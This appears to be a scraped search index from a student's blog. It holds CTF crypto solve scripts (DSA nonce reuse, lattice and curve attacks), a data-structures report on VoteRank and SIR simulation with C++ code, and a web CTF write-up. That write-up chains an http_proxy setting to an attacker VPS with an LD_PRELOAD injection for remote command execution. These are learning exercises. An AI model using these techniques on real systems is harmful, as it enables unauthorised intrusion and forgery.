ifile=open(\"cipher.enc\",'rb') plaintext=ifile.read() flag = \"cnss{**************************}\" assert len(flag) == 32 seq = \"\" for i in range(5): seq += \"{:08b}\".format(plaintext[i]^^ord(flag[i])) for mask in range(65536): state = seed \u0026 lenmask mask \u0026= lenmask for j in range(5 * 8): nextstate = (state\u003c\u003c1) \u0026 lenmask tmp = state \u0026 mask \u0026 lenmask output = 0 while tmp != 0: output ^^= (tmp \u0026 1) tmp \u003e\u003e= 1 nextstate ^^= output state = nextstate if output != int(seq[j]): break state = seed \u0026 lenmask mask \u0026= lenmask flag = \"\" for i in range(32): m = plaintext[i] seq = 0 for j in range(8): nextstate = (state\u003c\u003c1) \u0026 lenmask tmp = state \u0026 mask \u0026 lenmask output = 0 while tmp != 0: output ^^= (tmp \u0026 1) tmp \u003e\u003e= 1 nextstate ^^= output state = nextstate seq = (seq \u003c\u003c1 ) ^^ output flag += chr(seq ^^ m) assert len(flag) == 32 print(flag) ifile.close() ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:7:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🐍 RSA Ⅱ 题目附件 P = 0 Q = 0 SZ = 512 p_bits = [None for i in range(SZ)] q_bits = [None for i in range(SZ)] for i in range(SZ): if (mask1\u003e\u003ei \u0026 1) == 1: p_bits[i] = h1 \u003e\u003e i \u0026 1 if (mask2\u003e\u003ei \u0026 1) == 1: q_bits[i] = h2 \u003e\u003e i \u0026 1 def dfs(p, q, x): if x == SZ: if p * q == n: global P,Q P = p Q = q return lenmask = 2**(x+1) - 1 _p = [0,1] if p_bits[x] == None else [p_bits[x]] _q = [0,1] if q_bits[x] == None else [q_bits[x]] for pi in _p: for qi in _q: next_p = pi\u003c\u003cx | p next_q = qi\u003c\u003cx | q if next_p * next_q \u0026 lenmask == n \u0026 lenmask: dfs(next_p, next_q, x + 1) dfs(1, 1, 1) phi = (P - 1) * (Q - 1) d = inverse_mod(e, phi) flag = pow(c, d, n) print(long_to_bytes(flag)) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:8:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🦓 BabyLattice 题目附件 n = 4 L = Matrix.zero(n+2) for i in range(n+2): L[i, i] = 1 for i in range(n): L[i, 4] = numRound[i] L[4, 4] = modulus L[5, 4] = -result res = L.LLL()[0]%modulus flag = b\"\" for it in res: flag += long_to_bytes(it) print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:9:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🖥️ ezSignature 题目附件 REMOTE = remote(\"x.x.x.x\", xxx) # pass proof # sign # get p q g y r s1 s2 m = b\"I'm Admin.I want flag.\" m1 = b'I want to tell you a secret' m2 = b'Can you find it?' h = bytes_to_long(sha256(m).digest()) h1 = bytes_to_long(sha256(m1).digest()) h2 = bytes_to_long(sha256(m2).digest()) k = (inverse(s1-s2, q)*(h1-h2))%q assert pow(g, k, p) % q == r x = inverse(r, q)*(k*s1-h1)%q assert pow(g, x, p) == y # fake sign s = (inverse(k, q)*(h+x*r))%q print(\"[+] fake sign: \", ) print(\" r: \", r) print(\" s: \", s) REMOTE.recvuntil(b'your option:') REMOTE.sendline(b'2') REMOTE.recvuntil(b'message:') REMOTE.sendline(m) REMOTE.recvuntil(b'r:') REMOTE.sendline(str(r).encode()) REMOTE.recvuntil(b's:') REMOTE.sendline(str(s).encode()) mes = REMOTE.recv() print(mes[mes.find(b\"cnss\"):-1]) REMOTE.close() ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:10:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🦊 StrangeCurve 题目附件 sys.path.append(\"./crypto-attacks/attacks/ecc\") from smart_attack import attack p = 1096126227998177188652856107362412783873814431647 a = 0 b = 5 E = EllipticCurve(GF(p), [a, b]) base_point = E(626099523290649705896889901241128842906228328604,886038875771695334071307095455656761758842526929) Q = E(240653647745552223089451307742208085297121769374, 1041806436100548540817642210994295951394712587396) flag = b\"cnss{\"+long_to_bytes(attack(base_point, Q))+b\"}\" print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:11:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🐮 一🔪一个牛头人 题目附件 qdiv3 = Integers(q)(1/3) h3 = (Integer(qdiv3)*h) % q L = Matrix(2*N) for i in range(N):L[i,i] = q for i in range(N,2*N): L[i,i] = 1 for i in range(N): for j in range(N): L[i+N,j] = convolution(h3,x^i,R)[j] Mreduced = L.LLL() linehao = 0 for item in Mreduced: f = Zx(list(item[N:])) try: fp = invert_poly_mod_prime(f, R, p) except: linehao+=1 continue else: print(f\"Find line = {linehao}\") break a = balancedmod(convolution(c, f, R), q, R) mm = balancedmod(convolution(a, fp, R), p, R) def decode(poly): result = 0 ll = poly.list() for idx, val in enumerate(ll): result += (val + p // 2) * (p ** idx) return result print(long_to_bytes(decode(mm))) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:12:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🦄 MidLattice 题目附件 sys.path.append(\"./crypto-attacks/attacks/acd/\") from sda import attack rbit = 201 with open(\"output.txt\",\"r\") as file: sample = file.read() file.close() sample = list(map(int,sample[1:-1].split(','))) p ,r = attack(sample, rbit) flag = 'cnss{'+hashlib.sha256(long_to_bytes(p)).hexdigest()+'}' print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:13:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"⛏️ 铜匠的世界 题目附件 不会喵w^w, 怎么把 isqrt 和 ^^ 两次损失的信息利用起来呢? 能力有限只做到了这里，没有题解脚本了, 各位大佬见谅哩. 最后一题解法找 lvsun 问了一下还是爆破+smallroots, 使用 flatter 加速可以减少爆破时间. ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:14:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":null,"content":"关于 ","date":"2023-08-10","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"关于我 USETC 21级本科生 计算机科学与技术专业 无名混子 ","date":"2023-08-10","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"关于本站 不定期记录一些学习和生活所获（目前来看已经鸽穿了 ","date":"2023-08-10","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"关于以后 彼方尚有荣光在，________________ ","date":"2023-08-10","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"联系方式 lx10ng@qq.com ","date":"2023-08-10","objectID":"/about/:4:0","tags":null,"title":"About","uri":"/about/"},{"categories":["Project"],"content":"摘要：记录一下这学期数据结构做的一个项目","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"\r这是我本学期数据结构课的项目作业（最简单的一次作业，其他的写的太烂了，没脸放）。 首先就把我交上去的实验报告贴上来吧，懒得再写一次了。 ————————————————————-手动分割线————————————————————– ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:0:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"1.实验内容简介 分别根据以度为标准和以 Vote Rank 算法为标准选出两组重要节点组，然后用 SIR 模型评测传染规模来比较两种挖掘方案。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:1:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.算法说明 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.1. 根据度挖掘 直观的看，贪心地选出前 num 个初始传输结点。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:1","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.2. Vote Rank挖掘 通过投票选举的策略，在选出某一个结点之后，降低周围结点的投票能力，在一定程度上避免选出的初始节点出现扎堆的情况。从而尽可能地分散初始节点，使得传播的尽可能地广。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:2","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.3. SIR传染模型 用于测试上面两种方案的传播能力。设立感染，未感染，痊愈三种类别。通过初始结点开始进行传播，直到所有结点感染或者清零结束，通过比较感染过的节点数量比对两种初始结点选取方案的传播能力。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:3","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.算法分析与设计 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.1. 根据度挖掘 贪心的选择前 num 大的度的结点即可，这里不必进行排序算法，而是利用 nth_element 函数采用了类似于快速排序单次移位 partation 的思想。 nth_element(a.begin(), a.begin() + num, a.end(), cmp); 其中时间复杂度为 O(N) ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:1","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.2. Vote Rank挖掘 原始思想的过程如下： 1.初始化每个结点的分数为0，投票能力为1 2.遍历图，每个结点的分数为直接相连结点的投票能力之和 3.找出分数最高的结点 P，将 P 加入初始结点选集中 4.修改 P 的分数和投票能力为0，削弱 P 直接相连的结点，幅度为度的期望的倒数 5.重复 2-4 步，直至选出 num 个结点 而后考虑到每一次对选出结点和相邻结点投票能力的改变，只会影响 P 的二环和三环结点，并不会影响整个图的分数。所以只需要对二环投票能力和分数，三环的分数进行相应的修改即可。同时初始分数可以直接简化为改点邻接表的大小，而不必重复计算。 算法过程优化如下： 1.初始化每个结点的分数为该节点的度，投票能力为1 2.找出分数最高的结点 P，将 P 加入初始结点选集中 3.修改 P 的分数和投票能力为0 4.削弱 P 直接相连的结点，削弱与该结点直接相连的点的分数，幅度为度的期望的倒数 5.重复 2-4 步，直至选出 num 个结点 从效果来看，Vote Rank 算法避免了大量度值比较大的结点扎堆的情况，而是尽量地使选取的结点尽可能分布地广，从而使得传播范围扩大。 然后若所有结点的投票能力都下降为 0 会导致选不出分数最大的结点，因此当每次选出的最大分数结点的分数为 0 时，随机选择一个未加入过的结点作为初始结点。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:2","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.3. SIR 传播模型 通过设置结点为 S, I ,R 三种类别，其中 S 表示已传染的结点，在每一轮传染中，都有 beta 的概率传染和它直接相连的 I 类型结点，然后该 S 结点变为 R 类型的已痊愈结点。 算法过程如下： 1.将初始传播结点入队列 2.取队首结点弹出并设为 R 类型结点 3.遍历与它直接相连的 I 类型结点，每一个以 beta 的概率被传染为 S 4.第三步中被传染的结点加入队列中 5.重复 2-4 步直至队列为空，统计所有被传染过的结点的数量，即规模 该算法较为简化的模拟了结点的传播过程，可以作为两种挖掘方式的一种评测手段。 其中，直观上来看，Vote Rank 算法是对度算法的优化版本，选出的结点分布更为广泛，理应对传播规模有一定显式程度的提升。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:3","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"4.测试分析与结果 测试用例为 USAir.txt router.txt sex.txt network.txt 点数 332 5022 16730 36692 边数 2126 6258 50632 367662 具体内容见 ## 6.附录与源代码 ，以及附录文件 测试时，选择不同的感染率 beta 和不同的初始传播结点数 num，然后运行 500 次取平均值，计算 Vote Rank的提升幅度 首先是在选取初始传播结点数不同情况下，提升幅度的数据表 其中 beta 设置为 5*averageK/averageK2：五倍度的期望除以度的平方的期望 数据文件名 0.01 0.1 0.2 0.3 0.5 0.7 USAir.txt -0.01% 5.24% 11.95% 15.39% 7.73% 2.71% router.txt 1.70% 7.20% 6.18% 4.29% 1.27% 0.35% sex.txt 3.54% 12.51% 14.19% 13.10% 5.32% 2.64% network.txt 4.79% 16.22% 12.89% 9.95% 3.40% 1.61% 然后在确定初始传播结点数为总结点数的 0.2 情况下，改变 beta 前面的系数的数据表 数据文件名 0.1 1.2 2.0 3.0 5.0 10.0 USAir.txt 1.62% 12.57% 15.60% 14.78% 12.72% 5.84% router.txt 0.58% 4.36% 5.60% 6.31% 6.27% 2.97% sex.txt 0.72% 6.64% 9.37% 11.82% 14.01% 13.67% network.txt 0.40% 4.38% 6.74% 9.21% 12.89% 17.08% 由于相对图结构的感染率水平受稀疏稠密图影响较大，以下为 0.2 选取率下不同绝对感染率的数据表 数据文件名 0.001 0.01 0.1 0.3 0.5 0.8 USAir.txt 0.80% 6.02% 13.01% 4.24% 2.05% 0.48% router.txt 0.07% 0.73% 4.68% 6.49% 5.32% 2.23% sex.txt 0.39% 3.35% 14.57% 10.80% 6.11% 2.46% network.txt 1.10% 8.78% 15.638% 6.90% 4.84% 4.06% ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:4:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"5.分析与研讨 从测试结果中我们可以发现，当初始传播节点数目增加时，传播规模的提升度先上升再下降。当感染率增加时，提升度同样先上升再下降。 这是显而易见的，当传播结点较少时，两种方案都是优先选取结点较为大的点集，并没有多少差别。当初始传播节点数量增加时，初始结点差别变大，传播规模提升度增加。但是当初始传播结点数目增加到一定规模后，又几乎选出了大部分结点，两种方案差别变小，传播规模提升度下降。 而感染率同理，感染率较低，例如为 0.001 时，几乎传播不开，提升幅度很小。感染率很大接近于 1 时，几乎传遍了整个网络，提升幅度依然很小。只有当感染率位于适当大小时，提升度才有一个显然的水平。 同时，图的结构对测试结果影响很大，依赖于点与点之间的度的差别，由于测试数据中 router.txt 较为稀疏，各点的度差别较小，导致提升率相比其他测试数据偏小。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:5:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"6.改进方向 1.本实验中已经对 Vote Rank 算法进行了一定的优化，单次选点之后只更新一环和二环的结点，从而避免了重复遍历整个图。 2.在本次实验中，使用了 vector 进行存储，导致图的遍历的时，顺序是固定的。后续提升可以使用 undered_map 进行存储，消除数据集初始编号的影响。 3.在对单独数据找到最适合的初始传播点集和感染率可以采用模拟退火算法找到近似最优解。 ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:6:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"7.附录与源代码 以下为附件目录，具体文件内容见附件 $ tree -L 2 . |-- Makefile |-- data | |-- USAir.txt | |-- network.txt | |-- result.out | |-- router.txt | `-- sex.txt |-- output | `-- main.exe `-- src |-- main.cpp `-- main.o 3 directories, 9 files ————————————————————-手动分割线————————————————————– 贴一下源码吧还是 原谅我不加注释 #include \u003calgorithm\u003e #include \u003cctime\u003e #include \u003ciostream\u003e #include \u003cnumeric\u003e #include \u003cqueue\u003e #include \u003crandom\u003e #include \u003cvector\u003e typedef long long ll; using namespace std; vector\u003cint\u003e Du, Vote; vector\u003cvector\u003cint\u003e \u003e G; void SelectByDu(int num); void SelectByVote(int num); bool cmp(int x, int y); double Rand(); int TestSIR(vector\u003cint\u003e InitNode); double f; int n, m, u, v; int num; /* 选出的初始传播结点数目 */ double pjlunci = 500; /* 求平均值的轮数 */ vector\u003cint\u003e cntDu, cntVote; double meanDu, meanVote, varianceDu, varianceVote; double averageK, averageK2; double SIRbeta, SIRalpha; struct votenode { double score = 0, value = 1; }; int main(int argc, char *argv[]) { srand(time(NULL)); num = atoi(argv[2]); // SIRalpha = atof(argv[3]); SIRbeta = atof(argv[3]); freopen(argv[1], \"r\", stdin); freopen(\"data\\\\result.out\", \"w\", stdout); cin \u003e\u003e n \u003e\u003e m; cout \u003c\u003c \"[+] vertices : \" \u003c\u003c n \u003c\u003c \" edges : \" \u003c\u003c m \u003c\u003c endl; cout \u003c\u003c \"[+] the num of selected is \" \u003c\u003c num \u003c\u003c endl; G.resize(n); for (int i = 0; i \u003c m; i++) { cin \u003e\u003e u \u003e\u003e v; G[u].push_back(v), G[v].push_back(u); } averageK = 2.0 * m / n; f = 1.0 / averageK; SelectByDu(num); SelectByVote(num); for (auto \u0026i : G) averageK2 += pow(i.size(), 2) / (double)n; // SIRbeta = SIRalpha * (averageK / averageK2); cout \u003c\u003c \"averageK = \" \u003c\u003c averageK \u003c\u003c \" averageK2 =\" \u003c\u003c averageK2 \u003c\u003c \"\\n\" \u003c\u003c endl; cout \u003c\u003c \"SIRbeta = \" \u003c\u003c SIRbeta \u003c\u003c \"\\n\" \u003c\u003c endl; for (int i = 0; i \u003c pjlunci; i++) { cntDu.push_back(TestSIR(Du)), cntVote.push_back(TestSIR(Vote)); } meanDu = accumulate(cntDu.begin(), cntDu.end(), 0.0) / pjlunci; meanVote = accumulate(cntVote.begin(), cntVote.end(), 0.0) / pjlunci; for (int i = 0; i \u003c pjlunci; i++) { varianceDu += pow(cntDu[i] - meanDu, 2) / n; varianceVote += pow(cntVote[i] - meanVote, 2) / n; } cout \u003c\u003c \"[+] the mean of Du: \" \u003c\u003c meanDu \u003c\u003c \" the variance of Du: \" \u003c\u003c varianceDu \u003c\u003c endl; cout \u003c\u003c \"[+] the mean of Vote: \" \u003c\u003c meanVote \u003c\u003c \" the variance of Vote: \" \u003c\u003c varianceVote \u003c\u003c endl; cout \u003c\u003c \"rate : \" \u003c\u003c (meanVote - meanDu) / meanDu * 100 \u003c\u003c \" %\" \u003c\u003c endl; return 0; } bool cmp(int x, int y) { return G[x].size() \u003e G[y].size(); } double Rand() { return (double)rand() / RAND_MAX; } // 以度为顺序选出前 num 大的节点 void SelectByDu(int num) { clock_t start, finish; start = clock(); vector\u003cint\u003e a(n); for (int i = 0; i \u003c n; i++) a[i] = i; nth_element(a.begin(), a.begin() + num, a.end(), cmp); cout \u003c\u003c \"[+] Select by degree of vertex\" \u003c\u003c endl; for (int i = 0; i \u003c num; i++) Du.push_back(a[i]); sort(Du.begin(), Du.end(), cmp); // for (int i = 0; i \u003c num; i++) { // cout \u003c\u003c Du[i] \u003c\u003c \" \"; // } finish = clock(); cout \u003c\u003c endl \u003c\u003c \"[-] the time cost is:\" \u003c\u003c double(finish - start) / CLOCKS_PER_SEC \u003c\u003c endl \u003c\u003c endl; } void SelectByVote(int num) { clock_t start, finish; start = clock(); vector\u003cvotenode\u003e S(n); vector\u003cint\u003e vis(n); for (int i = 0; i \u003c n; i++) { S[i].score = G[i].size(), S[i].value = (double)1; } while (num--) { double maxScore = -1; int p = -1; for (int i = 0; i \u003c n; i++) { if (S[i].score \u003e maxScore) { maxScore = S[i].score; p = i; } } if (maxScore == 0) { for (int i = 0; i \u003c n; i++) { if (!vis[i]) { p = i; break; } } } vis[p] = 1; for (int i = 0; i \u003c (int)G[p].size(); i++) { u = G[p][i]; S[u].score -= S[p].value; double deltaval = S[u].value - max(S[u].value - f, (double)0); S[u].value = max(S[u].value - f, (double)0); for (int j = 0; j \u003c (int)G[u].size(); j++) { v = G[u][j]; S[v].score = max(S[v].score - deltaval, (double)0); } } S[p].score = S[p].value = 0; Vote.push_back(p); } cout \u003c\u003c \"[+] Select by vote of vertex\" \u003c\u003c endl; // for (int i = 0; i \u003c (int)Vote.size(); i++) { // cout \u003c\u003c Vote[i] \u003c\u003c \" \"; // } finish = clock(); cout \u003c\u003c endl \u003c\u003c \"[-] the time cost is:\" \u003c\u003c double(finish - start) / CLOCKS_PER_SEC \u003c\u003c endl \u003c\u003c endl; } int TestSIR(vector\u003cint\u003e Init","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:7:0","tags":["Project"],"title":"RankVote_重要节点组挖掘","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["CTF"],"content":"摘要：四川网安省赛2022","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/","tags":["CTF","WEB","Writeup"],"title":"四川省网安技能大赛2022-复现学习","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"\r","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:0:0","tags":["CTF","WEB","Writeup"],"title":"四川省网安技能大赛2022-复现学习","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"[WEB] requests 签到题，爆破一下 md5 然后读取文件路径 rce 就行 ","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:1:0","tags":["CTF","WEB","Writeup"],"title":"四川省网安技能大赛2022-复现学习","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"[WEB] justcurl from flask import render_template, request, Flask import os app = Flask(__name__) def check(s): if 'LD' in s or 'BASH' in s or 'ENV' in s or 'PS' in s: return False return True @ app.route('/') @ app.route('/index') def index(): try: choose = request.args.get('choose') except: choose = \"\" try: key = request.args.get('key') except: key = \"\" try: value = request.args.get('value').upper() except: value = \"\" if value: if check(value): os.environ[key] = value if choose == \"o\": cmd = \"curl http://127.0.0.1:5000/result -o options.txt\" elif choose == \"K\": cmd = \"curl http://127.0.0.1:5000/result -K options.txt\" else: cmd = \"curl http://127.0.0.1:5000/result\" try: res = os.popen(cmd).read() return \"your cmd is : \" + cmd + \" \\n and your result id :\" + res except: return \"error\" @ app.route('/result') def logout(): code = \"no result\" return render_template(\"index.html\",code=code) if __name__ == \"__main__\": app.run(host='0.0.0.0', port=5000) 关注 os.environ[key] = value 发现可以控制环境变量，可以利用的大概有 LD_PRELOAD ALL_PROXY HTTP_PROXY LD_PRELOAD 是常见的 disabled_function 绕过方式，而设置 PROXY 可以让服务器将请求发送到我们自己的 VPS 服务器需要收到请求之后返回 curl 配置文件，比赛的时候没看 文档 不会写😭 url = \"https://curl.se/docs/\" # --- Example file --- # this is a comment url = \"example.com\" output = \"curlhere.html\" user-agent = \"superagent/1.0\" # and fetch another URL too url = \"example.com/docs/manpage.html\" -O referer = \"http://nowhereatall.example.com/\" # --- End of example file --- 然后这里是 Hurrison’s Blog 的 wp 和例子 能够对 curl 配置文件可控之后，我们只需要利用 LD_PRELOAD 环境变量漏洞就可达成 rce 。 ?key=http_proxy\u0026value=http://\u003cip\u003e:80\u0026choose=K ?key=LD_PRELOAD\u0026value=./LIB.SO ?key=CMD\u0026value=ls%20/ 自己搭环境复现的时候会报错 ERROR: ld.so: object LD_PRELOAD cannot be preloaded: ignored ，应该是没有找到文件的原因，尝试写绝对路径 ","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:2:0","tags":["CTF","WEB","Writeup"],"title":"四川省网安技能大赛2022-复现学习","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"[WEB] simplephp 看起来像 sql 注入，fuzz 之后感觉禁用有些多，等 wp 了 